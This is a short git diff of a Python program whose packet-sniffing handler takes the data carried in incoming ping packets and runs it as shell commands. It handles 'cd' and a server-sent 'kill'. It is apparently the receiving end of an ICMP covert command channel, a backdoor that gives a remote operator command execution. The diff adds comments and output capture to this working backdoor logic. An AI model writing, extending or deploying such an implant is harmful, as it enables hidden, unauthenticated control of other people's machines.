@@ -14,19 +14,24 @@ from time import sleep
 def sniffHandle(packet: Packet) -> None:
     """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
     try:
+        # packet[3] is the raw layer that contains that data passed into the ping command
         decodedCommand = packet[3].load.decode()
         print(decodedCommand)
+
+        # checks if the user passed in the cd command
         cd_match = re.match(r"^cd\s*(.*)$", decodedCommand)
 
         if decodedCommand == "kill":
             raise Exception("Programmed killed by server")
+        # this is what the windows ping utility passes for data
         elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
             pass
         elif cd_match:
             path = cd_match.group(1)
             os.chdir(path=path)
         else:
-            subprocess.run(decodedCommand, shell=True)
+            subprocess.run(decodedCommand, shell=True, capture_output=True)
+    # the linux ping command passes some weird format in the raw load so this is to catch it, ultimately it doesn't matter if catch it
     except UnicodeDecodeError:
         print("Oh well")
 
